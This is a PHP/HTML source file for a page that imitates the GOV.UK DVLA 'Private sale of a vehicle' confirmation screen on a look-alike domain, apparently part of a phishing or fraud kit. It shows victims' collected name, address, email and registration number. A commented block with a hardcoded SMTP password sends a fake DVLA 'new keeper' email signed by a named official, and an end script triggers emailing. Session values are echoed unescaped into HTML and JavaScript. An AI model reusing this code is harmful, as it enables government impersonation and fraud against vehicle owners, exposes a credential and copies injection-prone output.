<?php

// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

// require '../vendor/autoload.php';
// require '../vendor/phpmailer/phpmailer/src/Exception.php';
// require '../vendor/phpmailer/phpmailer/src/PHPMailer.php';
// require '../vendor/phpmailer/phpmailer/src/SMTP.php';

// use PHPMailer\PHPMailer\PHPMailer;
// use PHPMailer\PHPMailer\Exception;



session_start();


// email sending logic starts here.

// if (isset($_GET['send_email']) && $_GET['send_email'] === 'true' && isset($_SESSION['email']) && isset($_SESSION['email']) !== '') {

//    $s_email = $_SESSION['email'] ?? null;
//    $v_registration = $_SESSION['v_registration'] ?? 'Unknown';
//    $trx_id = $_SESSION['trx_id'] ?? 'Unknown';

//    $mail = new PHPMailer(true);

//    try {
//       // Server settings
//       $mail->isSMTP();                              // Set mailer to use SMTP
//       $mail->Host       = 'mail.dvla-buy-sell-service.com';                       // SMTP server
//       $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
//       $mail->Username   = 'info@dvla-buy-sell-service.com';                 // SMTP username
//       $mail->Password   = 'Zg7Knlb4-DDFa';                  // SMTP password or app password
//       $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            // Enable SSL encryption
//       $mail->Port       = 465;                                    // TCP port for SSL

//       // Recipients
//       $mail->setFrom('info@dvla-buy-sell-service.com', 'Buy-Sell-Services');
//       $mail->addAddress($s_email, 'Support team'); // Add a recipient

//       // Content
//       // $mail->isHTML(true);                                        // Set email format to HTML
//       // $mail->Subject = 'Test Email';
//       // $mail->Body    = "<h1>This is a test email</h1><p>'".$_SESSION."'</p>";
//       // $mail->AltBody = 'This is the plain text version of the email content.';

//       $mail->isHTML(true); // Set email format to HTML
//       $mail->Subject = 'Vehicle Sale Details';
//       $mail->Body = '<div style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; background-color: #f9f9f9; margin: 0; padding: 0;">
//       <div style="max-width: 600px; margin: 20px auto; background: #fff; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
//           <div style="display:flex; align-items:center; gap:8px; background:black; padding:0px 10px">
//               <img src="https://dvla-buy-sell-service.com/second-step/assets/logo.svg" alt="GOV.UK Logo" style="max-width: 30px; filter: invert(100%);"> <h1 style="color:white; font-size:20px; font-weight:500">GOV.UK</h1>
//           </div>
//           <div style="margin-top: 20px;">
//               <h1 style="font-size: 18px; color: #000;">Driver & Vehicle Licensing Agency</h1>
//               <p style="margin: 10px 0;">DVLA has been notified electronically that you are now the new keeper of vehicle registration number: <span style="font-weight: bold;">' . $v_registration . '</span></p>
//               <p style="margin: 10px 0;">The online Transaction ID is: <span style="font-weight: bold;">' . $trx_id . '</span></p>
//               <p style="margin: 10px 0;">You should receive your new V5C registration certificate (logbook) within 2 weeks.</p>
//               <p style="margin: 10px 0;">Since 1st October 2014, vehicle tax can no longer be transferred as part of the sale. This is because the seller will automatically receive a refund of any remaining tax.</p>
//               <p style="margin: 10px 0;">You must tax this vehicle before it is driven on the road, tax now at <a href="https://www.gov.uk/vehicletax" style="color: #0066cc; text-decoration: none;">www.gov.uk/vehicletax</a>.</p>
//               <p style="margin: 10px 0;">If you do not want to tax you can make a SORN declaration now at <a href="https://www.gov.uk/sorn" style="color: #0066cc; text-decoration: none;">www.gov.uk/sorn</a>.</p>
//               <p style="margin: 10px 0;">For more information on driving and transport go to <a href="https://www.gov.uk/browse/driving" style="color: #0066cc; text-decoration: none;">www.gov.uk/browse/driving</a>.</p>
//               <p style="margin: 10px 0;">You may wish to save or print this email confirmation for your records.</p>
//               <p style="margin: 10px 0;">Yours sincerely,<br>Anthony Bamford<br>Vehicles Service Manager</p>
//           </div>
//           <div style="margin-top: 20px; font-size: 12px; color: #888; text-align: center;">
//               <p style="margin: 10px 0;">THIS IS AN AUTOMATED EMAIL - Please do not reply as emails received at this address cannot be responded to.</p>
//           </div>
//       </div>
//       </div>';

//       $mail->AltBody = 'Please check the details of the vehicle sale in the HTML version of this email.';
//       $mail->send();

//       echo 'Message has been sent successfully.';
//    } catch (Exception $e) {
//       echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
//    }
// }





$day = $_SESSION['dateofsale_day'];
$month = $_SESSION['dateofsale_month'];
$year = $_SESSION['dateofsale_year'];
// Check if the session data exists
$make = isset($_SESSION['v_make']) ? $_SESSION['v_make'] : 'N/A';
$model = isset($_SESSION['v_model']) ? $_SESSION['v_model'] : 'N/A';


?>

<!DOCTYPE html>
<html>

<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <!--<base href="#">-->
   <base href=".">
   <meta name="download_date" content="2024-01-08T12:14:40.939Z">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Summary - Private sale of a vehicle - GOV.UK</title>
   <link href="./styles.css" rel="stylesheet" type="text/css" />
   <link href="../style.css" rel="stylesheet" type="text/css" />
   <!--[if IE 8]>
      <link rel="stylesheet" href="#" type="text/css">
      <![endif]-->
   <link rel="shortcut icon"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      type="image/x-icon">
   <link rel="apple-touch-icon-precomposed"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#">
   <link rel="apple-touch-icon-precomposed"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      sizes="72x72">
   <link rel="apple-touch-icon-precomposed"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      sizes="76x76">
   <link rel="apple-touch-icon-precomposed"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      sizes="114x114">
   <link rel="apple-touch-icon-precomposed"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      sizes="120x120">
   <link rel="apple-touch-icon-precomposed"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      sizes="144x144">
   <link rel="apple-touch-icon-precomposed"
      href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      sizes="152x152">
   <!-- Google Analytics - Universal (support ends 1/7/2024)-->
   <!-- End Google Analytics Universal -->
   <!-- Google Tag Manager -->
   <!-- End Google Tag Manager -->
   <!--<base href="#">-->
   <base href=".">
</head>

<body class="js-enabled vsc-initialized" data-closing-time="1140">
   <!-- Google Tag Manager (noscript) -->
   <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WVJJC8C8" height="0" width="0"
         style="display:none;visibility:hidden"></iframe></noscript>
   <!-- End Google Tag Manager (noscript) -->
   <div id="global-cookie-message">
      <div class="cookie-message-wrapper">
         <p>GOV.UK uses cookies to make the site simpler.&nbsp;<a
               href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#">Find
               out more about cookies</a>
         </p>
      </div>
   </div>
   <a href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
      class="govuk-skip-link">Skip to main content</a>
   <header class="govuk-header " role="banner" data-module="govuk-header">
      <div class="govuk-header__container govuk-width-container">
         <div class="govuk-header__logo">
            <a class="govuk-header__link govuk-header__link--homepage" data-track-action="logoLink"
               data-track-category="headerClicked" data-track-label="https://www.gov.uk" data-track-dimension="GOV.UK"
               data-track-dimension-index="29"
               data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;header menu bar&quot;,&quot;external&quot;:&quot;false&quot;,&quot;text&quot;:&quot;GOV.UK&quot;,&quot;section&quot;:&quot;Logo&quot;,&quot;index_link&quot;:1,&quot;index_section&quot;:0,&quot;index_section_count&quot;:2,&quot;index_total&quot;:1}"
               id="logo" aria-label="Go to the GOV.UK homepage" href="#" https:="" www.gov.uk"="">
               <span class="govuk-header__logotype">
                  <!--[if gt IE 8]><!-->
                  <!--<![endif]-->
                  <!-- [if IE 8]> -->
                  <img src="./assets/logo.svg" style="filter: invert(100%);" alt=""
                     class="govuk-header__logotype-crown-fallback-image mb-3" width="36" height="32">
                  <!-- <![endif] -->
                  <span class="govuk-header__logotype-text" style="color: white;">
                     GOV.UK
                  </span>
               </span>
            </a>
         </div>

         <div class="govuk-header__content">
            <a href="" style="font-size: 25px !important; font-weight: 500 !important;"
               class="govuk-header__link govuk-header__service-name govuk-header-m-white">
               Private sale of a vehicle
            </a>
         </div>

      </div>
   </header>
   <div id="main">
      <div class="govuk-width-container">
         <div class="govuk-phase-banner">
            <p class="govuk-phase-banner__content">
               <strong class="govuk-tag govuk-phase-banner__content__tag">
                  beta
               </strong>
               <span class="govuk-phase-banner__text">
                  This is a new service -
                  <a class="govuk-link" id="feedback-open"
                     href="https://dvla-buysell-service.com/buysell-service/next/after/then/confirm/complete/almost/completed.php#"
                     target="_blank">your feedback</a>
                  will help us to improve it
               </span>
            </p>
         </div>
         <div class="section-content">
         </div>
         <main class="govuk-main-wrapper" id="main-content">
            <div class="app vehicles-change-keeper-online">
               <div class="two-col clearfix acquire-success">
                  <div class="second-col">
                     <div class="alert-complete">
                        <h1>Thank you</h1>
                        <br>
                        <p>The application is being processed</p>
                        <div style="font-weight:bold;" class="govuk-warning-text">
                           <span class="govuk-warning-text__icon" aria-hidden="true">!</span>
                           <strong class="govuk-warning-text__text">
                              <span class="govuk-warning-text__assistive">Warning</span>
                              <p><strong>Give the green new keeper slip to the new keeper and destroy the rest
                                    of the V5C registration certificate (logbook).</strong>
                              </p>
                           </strong>
                        </div>
                     </div>
                     <h2>What happens next for you?</h2>
                     <ul>
                        <li>we will send you (the previous keeper) a disposal acknowledgement letter.</li>
                        <li>we will automatically issue a refund for any full remaining months of vehicle tax
                           and cancel any direct debit (DD).
                        </li>
                        <li>both the disposal acknowledgement letter and refund will be sent to the address on
                           the V5C registration certificate (logbook).
                        </li>
                        <li>if you do not receive either within 4-6 weeks, please contact DVLA customer
                           enquiries as you could still be liable for the vehicle.
                        </li>
                        <li>you may want to take a print of this summary for your records.</li>
                     </ul>
                     <h2>What happens next for the new keeper?</h2>
                     <ul>
                        <li>since 1st October 2014 vehicle tax can no longer be transferred as part of the sale,
                           so the new keeper must tax the vehicle if they want to use it on the road.
                        </li>
                        <li>within 5 working days we will send a new V5C registration certificate (logbook) to
                           the new keeper.
                        </li>
                        <li>if they do not receive a new V5C registration certificate (logbook) in 2 weeks they
                           must contact DVLA customer enquiries.
                        </li>
                     </ul>
                  </div>
                  <div class="first-col">
                     <div class="playback transaction-details">
                        <h2>Transaction details</h2>
                        <dl>
                           <dt>Transaction ID</dt>
                           <dd><?php echo $_SESSION['trx_id'] ?> </dd>
                           <dt>Transaction date</dt>
                           <dd><?php echo $_SESSION['trx_date'] ?> </dd>
                        </dl>
                     </div>
                     <div class="playback related">
                        <h2>Vehicle details</h2>
                        <dl>
                           <dt>Registration number</dt>
                           <dd>
                              <div class="playback">
                                 <h2>Vehicle details</h2>
                                 <dl>
                                    <dt>Registration number</dt>
                                    <dd>
                                       <span class="reg-number"><?php echo $_SESSION['v_registration']; ?></span>
                                    </dd>
                                    <dt>Make</dt>
                                    <dd><?php echo htmlspecialchars($make); ?></dd>
                                    <dt>Model</dt>
                                    <dd><?php echo htmlspecialchars($model); ?></dd>
                                 </dl>
                              </div>
                              <div class="change-keeper-summary-playback">
                                 <div class="playback related bg-plain">
                                    <h2>New keeper details</h2>
                                    <dl>
                                       <dt>Name</dt>
                                       <dd><?php echo $_SESSION['privatekeeper_firstname']; ?></dd>
                                       <dt>Address</dt>
                                       <dd><?php echo $_SESSION['address'] ?> <br>
                                       </dd>
                                       <dt>Contact email address</dt>
                                       <dd><?php echo $_SESSION['email']; ?>
                                       </dd>
                                       <dt>Date of sale</dt>
                                       <dd><?php
                                             echo  $day . '-' . $month . '-' . $year;
                                             ?>
                                       </dd>
                                    </dl>
                                 </div>
                              </div>
                           </dd>
                        </dl>
                     </div>
                     <div class="form-steps">
                        <div class="step">
                        </div>
                        <div class="step">
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </main>
      </div>
   </div>
   <footer class="gem-c-layout-footer govuk-footer gem-c-layout-footer--border" role="contentinfo"
      data-module="ga4-link-tracker" data-ga4-link-tracker-module-started="true">
      <div class="govuk-width-container">

         <div class="govuk-footer__meta">
            <div class="govuk-footer__meta-item govuk-footer__meta-item--grow">
               <h2 class="govuk-visually-hidden">Support links</h2>
               <ul class="govuk-footer__inline-list govuk-!-display-none-print" data-module="gem-track-click"
                  data-track-links-only="" data-gem-track-click-module-started="true">
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help" data-track-options="{&quot;dimension29&quot;:&quot;Help&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help"="">Help</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/privacy-notice"
                        data-track-options="{&quot;dimension29&quot;:&quot;Privacy&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;2&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" privacy-notice"="">Privacy</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/cookies"
                        data-track-options="{&quot;dimension29&quot;:&quot;Cookies&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;3&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" cookies"="">Cookies</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/accessibility-statement"
                        data-track-options="{&quot;dimension29&quot;:&quot;Accessibility statement&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;4&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" accessibility-statement"="">Accessibility statement</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/contact" data-track-options="{&quot;dimension29&quot;:&quot;Contact&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;5&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" contact"="">Contact</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/terms-conditions"
                        data-track-options="{&quot;dimension29&quot;:&quot;Terms and conditions&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;6&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" terms-conditions"="">Terms and conditions</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" lang="cy" data-track-category="footerClicked"
                        data-track-action="supportLink" data-track-label="/cymraeg"
                        data-track-options="{&quot;dimension29&quot;:&quot;Rhestr o Wasanaethau Cymraeg&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;7&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" cymraeg"="">Rhestr
                        o Wasanaethau Cymraeg</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/government/organisations/government-digital-service"
                        data-track-options="{&quot;dimension29&quot;:&quot;Government Digital Service&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;8&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" government="" organisations=""
                        government-digital-service"="">Government Digital Service</a>
                  </li>
               </ul>
               <svg aria-hidden="true" focusable="false" class="govuk-footer__licence-logo"
                  xmlns="http://www.w3.org/2000/svg" viewBox="0 0 483.2 195.7" height="17" width="41">
                  <path fill="currentColor"
                     d="M421.5 142.8V.1l-50.7 32.3v161.1h112.4v-50.7zm-122.3-9.6A47.12 47.12 0 0 1 221 97.8c0-26 21.1-47.1 47.1-47.1 16.7 0 31.4 8.7 39.7 21.8l42.7-27.2A97.63 97.63 0 0 0 268.1 0c-36.5 0-68.3 20.1-85.1 49.7A98 98 0 0 0 97.8 0C43.9 0 0 43.9 0 97.8s43.9 97.8 97.8 97.8c36.5 0 68.3-20.1 85.1-49.7a97.76 97.76 0 0 0 149.6 25.4l19.4 22.2h3v-87.8h-80l24.3 27.5zM97.8 145c-26 0-47.1-21.1-47.1-47.1s21.1-47.1 47.1-47.1 47.2 21 47.2 47S123.8 145 97.8 145">
                  </path>
               </svg>
               <span class="govuk-footer__licence-description" data-module="gem-track-click"
                  data-track-action="copyrightLink" data-track-category="footerClicked"
                  data-track-label="https://www.nationalarchives.gov.uk/doc/open-government-licence/version/3/"
                  data-track-options="{&quot;dimension29&quot;: &quot;Open Government Licence v3.0&quot;}"
                  data-track-links-only="" data-ga4-track-links-only=""
                  data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;section&quot;:&quot;Licence&quot;,&quot;index_section&quot;:&quot;4&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;text&quot;:&quot;Open Government Licence v3.0&quot;,&quot;index_total&quot;:&quot;1&quot;,&quot;type&quot;:&quot;footer&quot;}"
                  data-gem-track-click-module-started="true">
                  All content is available under the <a class="govuk-footer__link" href="#" https:=""
                     www.nationalarchives.gov.uk="" doc="" open-government-licence="" version="" 3="" "="" rel="
                     license">Open Government Licence v3.0</a>,
                  except where otherwise stated
               </span>
            </div>
            <div class="govuk-footer__meta-item" data-module="gem-track-click" data-track-action="copyrightLink"
               data-track-category="footerClicked"
               data-track-label="https://www.nationalarchives.gov.uk/information-management/re-using-public-sector-information/uk-government-licensing-framework/crown-copyright/"
               data-track-options="{&quot;dimension29&quot;: &quot;© Crown copyright&quot;}" data-track-links-only=""
               data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;section&quot;:&quot;Copyright&quot;,&quot;index_section&quot;:&quot;5&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;text&quot;:&quot;© Crown copyright&quot;,&quot;index_total&quot;:&quot;1&quot;,&quot;type&quot;:&quot;footer&quot;}"
               data-gem-track-click-module-started="true">

               <a class="govuk-footer__link govuk-footer__copyright-logo" href="#" https:=""
                  www.nationalarchives.gov.uk="" information-management="" re-using-public-sector-information=""
                  uk-government-licensing-framework="" crown-copyright="" "="">© Crown copyright</a>
             </div>
          </div>
       </div>
    </footer>
      <div id=" global-app-error" class="app-error hidden">
            </div>


            <script>
               // Check if the email exists in the session
               const email = "<?php echo isset($_SESSION['email']) ? $_SESSION['email'] : ''; ?>";
               if (email) {
                  fetch('./process/send_email.php', {
                        method: 'POST',
                        headers: {
                           'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                           email
                        })
                     })
                     .then(response => response.json())
                     .then(data => console.log('Email sent:', data))
                     .catch(err => console.error('Error:', err));
               }
            </script>
</body>

</html>